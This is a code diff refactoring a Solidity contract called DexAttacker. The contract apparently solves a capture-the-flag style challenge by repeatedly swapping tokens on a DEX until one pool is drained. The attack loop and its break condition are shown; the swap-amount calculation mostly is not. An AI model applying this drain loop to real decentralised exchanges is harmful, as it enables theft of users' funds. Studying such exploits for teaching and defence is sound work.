@@ -13,10 +13,13 @@ interface IDex {
 }
 
 contract DexAttacker {
- function attack(IDex dex) public {
+  function swapAddresses(address from, address to) internal pure returns (address, address) {
+    return (to, from);
+  }
+
+  function attack(IDex dex) public {
     address from = dex.token1();
     address to = dex.token2();
-    address tmp; // textbook flipping of two variables
     uint256 desiredSwapAmount;
     uint256 balanceDexFrom;
 
@@ -34,11 +37,8 @@ contract DexAttacker {
 
       if (dex.balanceOf(to, address(dex)) == 0) {
         break;
-      } else {
-        tmp = from;
-        from = to;
-        to = tmp;
       }
+      (from, to) = swapAddresses(from, to);
     }
   }
 }
